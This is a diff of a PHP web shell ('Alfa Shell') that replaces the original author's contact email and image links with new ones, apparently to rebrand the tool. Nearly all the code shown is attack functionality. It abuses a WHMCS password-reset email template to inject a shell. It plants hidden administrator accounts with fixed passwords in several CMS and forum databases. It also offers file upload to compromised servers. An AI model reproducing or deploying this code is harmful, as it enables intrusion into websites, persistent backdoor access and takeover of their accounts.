@@ -616,7 +616,7 @@ echo '
     }
 
     body {
-        background-image: url("https://raw.githubusercontent.com/haxorstars/archive/main/media/scleton.gif"), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
+        background-image: url("https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/me.gif"), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
         background-position: center;
         background-size: cover;
         background-repeat: no-repeat;
@@ -883,7 +883,7 @@ echo '
 <body>
     <div class="terminal">
         <div class="headerTerm">
-            <img src="https://raw.githubusercontent.com/haxorstars/archive/main/media/terminal.png"
+            <img src="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/terminal.png"
                 alt="terminal" /><span>Terminal</span>
             <strong>
                 Alfa Shell Haxor Login
@@ -2255,19 +2255,19 @@ $tempSave = str_replace("'","\'",$tempSave1);
 mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($conn));
 $inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
 $result = mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('nulz404@proton.me')";
+$create = "insert into tblclients (email) values('sysadmin.mikrotik@proton.me')";
 $result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version') && $method == 'auto'){
 $AlfaSole = new AlfaCURL(true);
 $saveurl = $AlfaSole->Send($path."/pwreset.php");
 $getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=nulz404@proton.me");
+$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=sysadmin.mikrotik@proton.me");
 $backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
 $Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
 __alert("shell injectet...");
 $ff= 'http://'.$path."/solevisible.php";
 output($ff);}else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>nulz404@proton.me</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>sysadmin.mikrotik@proton.me</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
 }if(isset($_POST['alfa2']) && $_POST['alfa2']== 'mybb'){
 AlfaNum(1,2,3,5);
 echo __pre()."<p><div class='txtfont_header'>| MyBB |</div></p><center><center>".getConfigHtml("mybb")."<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
@@ -2665,7 +2665,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <input type='hidden' name='ajax' value='true'>
 <input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Alfa Shell NuLz &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: bc1q9pq38fg09kenj0fqmamhl6fxeemw60j7uh5jax\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>nulz404@proton.me</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://haxorstars.t.me'>@haxorstars</a></span></div></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Alfa Shell NuLz &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: bc1q9pq38fg09kenj0fqmamhl6fxeemw60j7uh5jax\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>sysadmin.mikrotik@proton.me</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://haxorstars.t.me'>@haxorstars</a></span></div></td>
 </tr>
 </table>
 </div>
@@ -3823,19 +3823,19 @@ $tempSave1 = $soleGet['message'];
 $tempSave = str_replace("'","\'",$tempSave1);
 $inject = "UPDATE tblemailtemplates SET message='$Def' WHERE name='Password Reset Validation'";
 $result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('nulz404@proton.me')";
+$create = "insert into tblclients (email) values('sysadmin.mikrotik@proton.me')";
 $result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version')){
 $AlfaSole = new AlfaCURL(true);
 $saveurl = $AlfaSole->Send($path."/pwreset.php");
 $getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=nulz404@proton.me");
+$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=sysadmin.mikrotik@proton.me");
 $backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
 $Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
 __alert('File Created...');
 echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$path."/".$fname."'>Click Here !</a></font></b></center><br><br>";
 }else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>nulz404@proton.me</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>sysadmin.mikrotik@proton.me</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
 }}}}
 if(isset($_POST['alfa1']) && ($_POST['alfa1'] == 'vb')){
 echo __pre();
@@ -4274,7 +4274,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'nulz404', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nulz404@proton.me', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sysadmin.mikrotik@proton.me', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form>';
@@ -4320,7 +4320,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'nulz404', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nulz404@proton.me', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sysadmin.mikrotik@proton.me', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4366,7 +4366,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nulz404@proton.me', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sysadmin.mikrotik@proton.me', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4417,7 +4417,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nulz404@proton.me', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sysadmin.mikrotik@proton.me', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4457,7 +4457,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nulz404@proton.me', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sysadmin.mikrotik@proton.me', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4492,7 +4492,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nulz404@proton.me', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sysadmin.mikrotik@proton.me', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4527,7 +4527,7 @@ $table = array('td1' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nulz404@proton.me', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sysadmin.mikrotik@proton.me', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4575,7 +4575,7 @@ $getDescuid = @mysqli_query($conn,"select uid from users order by uid desc limit
 $getDescuid = @mysqli_fetch_assoc($getDescuid);
 $getDescuid = $getDescuid['uid'];
 $getdescuid = $getDescuid++;
-$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','nulz404@proton.me','filtered_html','1','Europe/Berlin','nulz404@proton.me')") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','sysadmin.mikrotik@proton.me','filtered_html','1','Europe/Berlin','sysadmin.mikrotik@proton.me')") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
 $sole = mysqli_num_rows($solevisible);
 if ($sole == 1){
@@ -4617,7 +4617,7 @@ $prefix = $_POST['alfa7'];
 $admin = $_POST['alfa8'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $setpwAlg = sha1(strtolower($admin) . 'solevisible');
-$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','nulz404@proton.me')") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','sysadmin.mikrotik@proton.me')") or die(mysqli_error($conn));
 if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
